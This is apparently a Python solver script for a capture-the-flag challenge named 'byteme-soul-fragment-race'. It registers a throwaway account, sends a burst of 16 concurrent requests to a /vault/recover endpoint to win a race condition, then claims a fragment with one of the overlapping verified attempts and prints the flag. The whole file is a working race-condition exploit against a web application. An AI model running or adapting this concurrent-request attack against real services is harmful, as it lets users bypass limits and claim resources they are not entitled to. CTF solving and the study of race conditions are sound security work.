import requests
import secrets
import time
from concurrent.futures import ThreadPoolExecutor

BASE_URL = "https://byteme-soul-fragment-race.onrender.com"

def solve():
    session = requests.Session()
    uname = "solver_" + secrets.token_hex(4)
    passwd = "SuperPassword123!"

    print(f"[*] Registering user: {uname}")
    r = session.post(f"{BASE_URL}/register", data={"username": uname, "password": passwd})
    assert r.status_code in [200, 302], "Registration failed"

    st = session.get(f"{BASE_URL}/api/status").json()
    print(f"[*] Initial fragments: {st['fragments']}/7, Awakened: {st['awakened']}")

    def send_recover():
        try:
            return session.post(f"{BASE_URL}/vault/recover", timeout=5).json()
        except Exception as e:
            return {"error": str(e)}

    print("[*] Launching concurrent burst to /vault/recover...")
    with ThreadPoolExecutor(max_workers=16) as pool:
        futures = [pool.submit(send_recover) for _ in range(16)]
        results = [f.result() for f in futures]

    created_attempts = [res["attempt"] for res in results if "attempt" in res]
    print(f"[+] Successfully created {len(created_attempts)} overlapping attempts: {created_attempts}")

    if len(created_attempts) < 2:
        print("[-] Race missed; retry needed.")
        return False

    print("[*] Waiting 0.5s for worker verification...")
    time.sleep(0.5)

    st = session.get(f"{BASE_URL}/api/status").json()
    verified_attempts = [a["id"] for a in st["attempts"] if a["status"] == "verified"]
    print(f"[+] Verified attempts count: {len(verified_attempts)}")

    if len(verified_attempts) >= 2:
        target_aid = verified_attempts[0]
        print(f"[*] Claiming fragment using attempt {target_aid}...")
        claim_res = session.post(f"{BASE_URL}/vault/claim", json={"attempt": target_aid}).json()
        print(f"[!] Claim Response: {claim_res}")
        if "flag" in claim_res:
            print(f"\n[+] FLAG: {claim_res['flag']}\n")
            return claim_res["flag"]
    else:
        print("[-] Insufficient verified attempts in window.")
        return False

if __name__ == "__main__":
    solve()
